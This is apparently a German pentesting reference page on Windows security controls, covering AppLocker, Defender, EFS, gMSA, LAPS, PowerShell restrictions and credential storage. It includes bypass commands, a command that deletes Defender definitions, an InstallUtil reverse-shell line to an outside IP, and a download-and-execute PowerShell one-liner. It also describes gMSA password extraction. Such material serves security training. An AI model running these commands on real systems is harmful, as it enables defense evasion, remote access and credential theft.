# Windows Security Controls

{{#include ../banners/hacktricks-training.md}}

## AppLocker Policy

Eine Anwendungs-Whitelist ist eine Liste genehmigter Softwareanwendungen oder ausführbarer Dateien, die auf einem System vorhanden sein und ausgeführt werden dürfen. Ziel ist es, die Umgebung vor schädlicher Malware und nicht genehmigter Software zu schützen, die nicht den spezifischen geschäftlichen Anforderungen einer Organisation entspricht.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ist die **Anwendung für Application Whitelisting** von Microsoft und gibt Systemadministratoren Kontrolle darüber, **welche Anwendungen und Dateien Benutzer ausführen können**. Sie bietet **granulare Kontrolle** über ausführbare Dateien, Skripte, Windows-Installationsdateien, DLLs, gepackte Apps und Installationsprogramme für gepackte Apps.\
Organisationen **blockieren häufig cmd.exe und PowerShell.exe** sowie den Schreibzugriff auf bestimmte Verzeichnisse, **aber all dies kann umgangen werden**.

### Check

Prüfe, welche Dateien/Erweiterungen auf der Blacklist/Whitelist stehen:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
`Test-AppLockerPolicy` wertet Kandidatendateien für eine bestimmte Identität anhand einer AppLocker-Richtlinie aus. Teste das Konto, dessen Token die Payload ausführt, da Regeln auf Benutzer oder Gruppen abzielen können; `Get-AppLockerFileInformation` ist ebenfalls nützlich, um Pfad-, Hash- und Publisher-Metadaten zu untersuchen, anhand derer Regeln übereinstimmen können.<sup>[[5]](#references)</sup>
```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```
Dieser Registrierungspfad enthält die von AppLocker angewendeten Konfigurationen und Richtlinien und bietet eine Möglichkeit, den aktuell auf dem System erzwungenen Regelsatz zu überprüfen:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Nützliche **Writable folders** zum Umgehen der AppLocker Policy: Wenn AppLocker die Ausführung beliebiger Dateien innerhalb von `C:\Windows\System32` oder `C:\Windows` erlaubt, gibt es **writable folders**, die du verwenden kannst, um dies zu **bypass**en.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Häufig als **vertrauenswürdig** eingestufte [**„LOLBAS“-**](https://lolbas-project.github.io/)Binaries können ebenfalls nützlich sein, um AppLocker zu umgehen.
- **Schlecht geschriebene Regeln könnten ebenfalls umgangen werden.**
- Zum Beispiel kann bei **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** überall ein **Ordner namens `allowed`** erstellt werden, und er wird zugelassen.
- Organisationen konzentrieren sich außerdem häufig darauf, die ausführbare Datei **`%System32%\WindowsPowerShell\v1.0\powershell.exe`** zu **blockieren**, vergessen jedoch die **anderen** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) wie `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` oder `PowerShell_ISE.exe`.
- **Die DLL-Durchsetzung ist nur sehr selten aktiviert**, da sie ein System zusätzlich belasten kann und umfangreiche Tests erforderlich sind, um sicherzustellen, dass nichts beschädigt wird. Daher kann die Verwendung von **DLLs als Backdoors dabei helfen, AppLocker zu umgehen**.
- Mit [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) oder [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kannst du **Powershell**-Code in jedem Prozess **ausführen** und AppLocker umgehen. Weitere Informationen findest du unter: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Speicherung von Anmeldeinformationen

### Security Accounts Manager (SAM)

Lokale Anmeldeinformationen befinden sich in dieser Datei; die Passwörter sind gehasht.

### Local Security Authority (LSA) - LSASS

Die **Anmeldeinformationen** (gehasht) werden aus Gründen des Single Sign-On im **Speicher** dieses Subsystems **gespeichert**.\
**LSA** verwaltet die lokale **Sicherheitsrichtlinie** (Passwortrichtlinie, Benutzerberechtigungen ...), die **Authentifizierung**, **Zugriffstoken** ...\
LSA ist dafür zuständig, die bereitgestellten Anmeldeinformationen in der **SAM**-Datei (bei einer lokalen Anmeldung) zu **überprüfen** und mit dem **Domain Controller** zu **kommunizieren**, um einen Domain-Benutzer zu authentifizieren.

Die **Anmeldeinformationen** werden im **Prozess LSASS** **gespeichert**: Kerberos-Tickets, NT- und LM-Hashes sowie leicht entschlüsselbare Passwörter.

### LSA secrets

LSA kann einige Anmeldeinformationen auf der Festplatte speichern:

- Passwort des Computerkontos des Active Directory (nicht erreichbarer Domain Controller).
- Passwörter der Konten von Windows-Diensten
- Passwörter für geplante Tasks
- Weitere (Passwort von IIS-Anwendungen ...)

### NTDS.dit

Dies ist die Datenbank des Active Directory. Sie ist nur auf Domain Controllern vorhanden.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) ist ein Antivirusprogramm, das in Windows 10 und Windows 11 sowie in Versionen von Windows Server verfügbar ist. Es **blockiert** häufig verwendete pentesting tools wie **`WinPEAS`**. Es gibt jedoch Möglichkeiten, diese **Schutzmaßnahmen zu umgehen**.

### Überprüfung

Um den **Status** von **Defender** zu überprüfen, kannst du das PS-Cmdlet **`Get-MpComputerStatus`** ausführen (überprüfe den Wert von **`RealTimeProtectionEnabled`**, um festzustellen, ob es aktiv ist):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Um es zu enumerieren, kannst du auch Folgendes ausführen:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Verschlüsseltes Dateisystem (EFS)

EFS sichert Dateien durch Verschlüsselung und verwendet dabei einen **symmetrischen Schlüssel**, den sogenannten **File Encryption Key (FEK)**. Dieser Schlüssel wird mit dem **öffentlichen Schlüssel** des Benutzers verschlüsselt und im **alternativen Datenstrom** $EFS der verschlüsselten Datei gespeichert. Wenn eine Entschlüsselung erforderlich ist, wird der entsprechende **private Schlüssel** des digitalen Zertifikats des Benutzers verwendet, um den FEK aus dem $EFS-Datenstrom zu entschlüsseln. Weitere Details finden sich [hier](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Szenarien für eine Entschlüsselung ohne Benutzeraktion** umfassen:

- Wenn Dateien oder Ordner in ein Nicht-EFS-Dateisystem wie [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) verschoben werden, werden sie automatisch entschlüsselt.
- Über das Netzwerk mittels SMB/CIFS-Protokoll gesendete verschlüsselte Dateien werden vor der Übertragung entschlüsselt.

Diese Verschlüsselungsmethode ermöglicht dem Besitzer einen **transparenten Zugriff** auf verschlüsselte Dateien. Das einfache Ändern des Passworts des Besitzers und anschließende Anmelden ermöglicht jedoch keine Entschlüsselung.

**Wichtige Erkenntnisse**:

- EFS verwendet einen symmetrischen FEK, der mit dem öffentlichen Schlüssel des Benutzers verschlüsselt wird.
- Die Entschlüsselung verwendet den privaten Schlüssel des Benutzers, um auf den FEK zuzugreifen.
- Unter bestimmten Bedingungen erfolgt eine automatische Entschlüsselung, beispielsweise beim Kopieren nach FAT32 oder bei der Netzwerkübertragung.
- Verschlüsselte Dateien sind für den Besitzer ohne zusätzliche Schritte zugänglich.

### EFS-Informationen prüfen

Prüfe, ob ein **Benutzer** diesen **Dienst** **verwendet**, indem du prüfst, ob dieser Pfad existiert:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Prüfe, **wer** **Zugriff** auf die Datei hat, mit cipher /c \<file>\
Du kannst auch `cipher /e` und `cipher /d` innerhalb eines Ordners verwenden, um alle Dateien zu **verschlüsseln** und zu **entschlüsseln**

### EFS-Dateien entschlüsseln

#### Als Authority System

Dieser Ansatz setzt voraus, dass der **Opferbenutzer** gerade einen **Prozess** auf dem Host **ausführt**. Falls dies der Fall ist, kannst du aus einer `meterpreter`-Sitzung das Prozesstoken des Benutzers imitieren (`impersonate_token` aus `incognito`). Alternativ kannst du in den Prozess des Benutzers `migrate`.

#### Das Passwort des Benutzers kennen

Mimikatz kann das Zertifikat und den privaten Schlüssel des Benutzers importieren und anschließend verwenden, um durch EFS geschützte Dateien zu entschlüsseln.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft entwickelte **Group Managed Service Accounts (gMSA)**, um die Verwaltung von Dienstkonten in IT-Infrastrukturen zu vereinfachen. Im Gegensatz zu herkömmlichen Dienstkonten, bei denen häufig die Einstellung "**Password never expire**" aktiviert ist, bieten gMSAs eine sicherere und besser verwaltbare Lösung:

- **Automatische Passwortverwaltung**: gMSAs verwenden ein komplexes, 240 Zeichen langes Passwort, das sich entsprechend der Domänen- oder Computerrichtlinie automatisch ändert. Dieser Prozess wird vom Microsoft Key Distribution Service (KDC) verwaltet, wodurch manuelle Passwortaktualisierungen entfallen.
- **Erhöhte Sicherheit**: Diese Konten sind gegen Sperrungen geschützt und können nicht für interaktive Anmeldungen verwendet werden, wodurch ihre Sicherheit erhöht wird.
- **Unterstützung mehrerer Hosts**: gMSAs können von mehreren Hosts gemeinsam verwendet werden und eignen sich daher ideal für Dienste, die auf mehreren Servern ausgeführt werden.
- **Unterstützung geplanter Aufgaben**: Im Gegensatz zu Managed Service Accounts unterstützen gMSAs die Ausführung geplanter Aufgaben.
- **Vereinfachte SPN-Verwaltung**: Das System aktualisiert den Service Principal Name (SPN) automatisch, wenn sich die sAMaccount-Details oder der DNS-Name des Computers ändern, wodurch die SPN-Verwaltung vereinfacht wird.

Die Passwörter für gMSAs werden in der LDAP-Eigenschaft _**msDS-ManagedPassword**_ gespeichert und von Domain Controllern (DCs) automatisch alle 30 Tage zurückgesetzt. Dieses Passwort, ein verschlüsseltes Datenblob namens [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), kann nur von autorisierten Administratoren und den Servern abgerufen werden, auf denen die gMSAs installiert sind, wodurch eine sichere Umgebung gewährleistet wird. Für den Zugriff auf diese Informationen ist eine gesicherte Verbindung wie LDAPS erforderlich, oder die Verbindung muss mit 'Sealing & Secure' authentifiziert sein.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Du kannst dieses Passwort mit [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:** auslesen.
```
/GMSAPasswordReader --AccountName jkohler
```
[**Weitere Informationen in diesem Beitrag**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Siehe auch diese [Webseite](https://cube0x0.github.io/Relaying-for-gMSA/) dazu, wie ein **NTLM relay attack** durchgeführt werden kann, um das **Passwort** von **gMSA** zu **lesen**.<sup>[[3]](#references)</sup>

## LAPS

Unterscheide bei der Enumeration zwischen **legacy Microsoft LAPS** und der nativen **Windows LAPS**-Implementierung. Windows LAPS wurde mit den Windows-Updates vom 11. April 2023 veröffentlicht und kann ein verwaltetes lokales Administratorpasswort in **Windows Server Active Directory** oder der **Microsoft Entra ID** sichern. Bei AD-gestützten Deployments kann es Passwörter zusätzlich verschlüsseln, einen Verlauf verschlüsselter Passwörter aufbewahren und das DSRM-Passwort eines Domain Controllers verwalten. Die herunterladbare legacy MSI ist bei neueren Windows-Versionen veraltet, obwohl Windows LAPS im Legacy-Emulationsmodus betrieben werden kann.<sup>[[6]](#references)</sup>

Da legacy Microsoft LAPS und Windows LAPS separate Implementierungen sind, muss vor der Anwendung von attribut- oder cmdlet-spezifischen Angriffen festgestellt werden, welche Variante eingesetzt wird. Die verlinkte Seite behandelt Discovery, ACL-Enumeration, Abruf, Ablaufmanipulation und Offline-Recovery, ohne diese Verfahren hier zu duplizieren.<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

Der PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **schränkt viele der für eine effektive Nutzung von PowerShell erforderlichen Funktionen ein**, beispielsweise durch die Blockierung von COM-Objekten, die Beschränkung auf genehmigte .NET-Typen, XAML-basierte Workflows, PowerShell-Klassen und mehr.

### **Prüfen**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
In aktuellen Windows-Versionen funktioniert dieser Bypass nicht, aber du kannst [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) verwenden.\
**Zum Kompilieren musst du möglicherweise** **eine** _**Referenz hinzufügen**_ -> _Durchsuchen_ ->_Durchsuchen_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` hinzufügen und **das Projekt auf .Net4.5 ändern**.

#### Direkter Bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Du kannst [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) oder [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) verwenden, um **Powershell**-Code in jedem Prozess **auszuführen** und den eingeschränkten Modus zu umgehen. Weitere Informationen findest du unter: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## PS-Ausführungsrichtlinie

Standardmäßig ist sie auf **restricted** gesetzt. Die wichtigsten Möglichkeiten, diese Richtlinie zu umgehen:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Mehr dazu finden Sie [hier](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

Ist die API, die zur Authentifizierung von Benutzern verwendet werden kann.

Die SSPI ist dafür zuständig, das geeignete Protokoll für zwei Computer zu finden, die miteinander kommunizieren möchten. Die bevorzugte Methode hierfür ist Kerberos. Anschließend handelt die SSPI aus, welches Authentifizierungsprotokoll verwendet wird. Diese Authentifizierungsprotokolle werden Security Support Provider (SSP) genannt, befinden sich in Form einer DLL auf jedem Windows-Computer, und beide Computer müssen denselben unterstützen, um kommunizieren zu können.

### Main SSPs

- **Kerberos**: Das bevorzugte Protokoll
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** und **NTLMv2**: Aus Kompatibilitätsgründen
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Webserver und LDAP, Passwort in Form eines MD5-Hashs
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL und TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Wird verwendet, um das zu verwendende Protokoll auszuhandeln (Kerberos oder NTLM, wobei Kerberos das Standardprotokoll ist)
- %windir%\Windows\System32\lsasrv.dll

#### Die Aushandlung kann mehrere Methoden oder nur eine anbieten.

## UAC - Benutzerkontensteuerung

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die eine **Zustimmungsaufforderung für Aktivitäten mit erhöhten Rechten** aktiviert.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}



## References

- [1] [AppLocker und den eingeschränkten PowerShell-Sprachmodus umgehen](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [Anleitung ~ EFS-Dateien entschlüsseln](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying für gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 Möglichkeiten, die PowerShell Execution Policy zu umgehen](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [Die AppLocker-Windows-PowerShell-Cmdlets verwenden](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Überblick über Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
{{#include ../banners/hacktricks-training.md}}
